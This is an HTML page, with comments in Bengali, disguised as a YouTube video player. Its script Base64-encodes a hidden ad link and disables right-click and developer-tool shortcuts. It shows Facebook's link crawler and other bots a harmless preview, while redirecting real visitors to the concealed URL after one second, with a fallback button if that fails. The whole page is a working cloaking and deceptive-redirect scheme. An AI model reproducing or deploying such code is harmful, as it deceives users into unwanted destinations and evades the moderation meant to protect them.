<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Video - YouTube</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', Arial, sans-serif;
        }

        body {
            background-color: #0f0f0f; /* ইউটিউবের ডার্ক থিম */
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .container {
            width: 90%;
            max-width: 800px;
            text-align: center;
        }

        .video-player {
            width: 100%;
            aspect-ratio: 16 / 9;
            background-color: #000;
            border-radius: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            overflow: hidden;
        }

        /* ডামি ইউটিউব প্লে বাটন */
        .play-button {
            width: 80px;
            height: 80px;
            background-color: rgba(255, 0, 0, 0.9);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .play-button:hover {
            transform: scale(1.1);
            background-color: #ff0000;
        }

        .play-button svg {
            width: 35px;
            height: 35px;
            fill: white;
            margin-left: 5px;
        }

        .video-info {
            margin-top: 20px;
            text-align: left;
        }

        .video-info h1 {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .video-info p {
            font-size: 14px;
            color: #aaa;
        }

        /* লোডিং এবং ফলব্যাক টেক্সট */
        .loading-text {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
            display: none; 
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 0.5; }
            50% { opacity: 1; }
            100% { opacity: 0.5; }
        }

        .fallback-btn {
            display: inline-block;
            margin-top: 15px;
            padding: 10px 20px;
            background-color: #ff0000;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            animation: none !important;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- ভিডিও প্লেয়ার সেকশন -->
        <div class="video-player" id="videoPlayer">
            <div class="play-button">
                <svg viewBox="0 0 24 24">
                    <path d="M8 5v14l11-7z"/>
                </svg>
            </div>
        </div>

        <!-- ভিডিওর টাইটেল ও ইনফো -->
        <div class="video-info">
            <h1 id="videoTitle">Loading Video Preview...</h1>
            <p>Please wait while the video loads...</p>
        </div>

        <!-- রিডাইরেক্ট হওয়ার সময় এই লেখাটি দেখাবে -->
        <div class="loading-text" id="loadingText">
            <i>Redirecting to content...</i>
        </div>
    </div>

    <script>
        // ১. লিংক এনক্রিপ্ট করা (Base64)
        const encodedLink = "aHR0cHM6Ly9mYWxzaWZ5ZHdpZ2h0LmNvbS9zcGRzMzA5dW4/a2V5PWU5Njk0YjhlMDIxMTMyM2ZjY2E3MGU5Y2U2N2Q3ZDNh";
        const adsterraLink = atob(encodedLink); 
        
        // ভিডিও টাইটেল সেট করা
        const videoTitle = "Amazing Video - Must Watch!";
        const titleEl = document.getElementById('videoTitle');
        if (titleEl) titleEl.innerText = videoTitle;

        // ২. রাইট-ক্লিক এবং ডেভেলপার টুলস ব্লক করা
        document.addEventListener('contextmenu', e => e.preventDefault()); 
        document.onkeydown = function(e) {
            if(e.keyCode == 123 || // F12
               (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || // Ctrl+Shift+I/J
               (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) { // Ctrl+U
                return false;
            }
        };

        // ৩. ফেসবুক বট ও অন্যান্য বট ডিটেকশন
        function isBot() {
            const ua = navigator.userAgent.toLowerCase();
            return /facebookexternalhit|facebookbot|meta-externalagent|facebookcatalog|bot|crawler|spider|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
        }

        // ৪. মূল লজিক (Main Logic)
        if (isBot()) {
            // বট হলে রিডাইরেক্ট হবে না
            document.getElementById('loadingText').innerHTML = "<i>Preview mode - Redirect blocked.</i>";
            document.getElementById('loadingText').style.display = 'block';
        } else {
            // মানুষ হলে ১ সেকেন্ড পর রিডাইরেক্ট
            setTimeout(function () {
                const loadingText = document.getElementById('loadingText');
                if (loadingText) {
                    loadingText.style.display = 'block';
                    loadingText.innerHTML = "<i>Redirecting to content...</i>";
                }
                
                // রিডাইরেক্ট এক্সিকিউট
                try {
                    window.location.href = adsterraLink; 
                } catch (error) {
                    console.log("Redirect failed");
                }
                
                // ⚠️ ফলব্যাক (Fallback): যদি অ্যাডব্লকার বা অন্য কারণে রিডাইরেক্ট ব্লক হয়, 
                // তবে ৩ সেকেন্ড পর একটি ম্যানুয়াল লাল বাটন দেখাবে যাতে ইউজার নিজে ক্লিক করতে পারে।
                setTimeout(() => {
                    if (loadingText && window.location.href.includes("technologydaily.xyz")) {
                        loadingText.innerHTML = `<a href="${adsterraLink}" class="fallback-btn">Click here to continue</a>`;
                    }
                }, 3000);
                
            }, 1000); // ১ সেকেন্ড
        }
    </script>

</body>
</html>
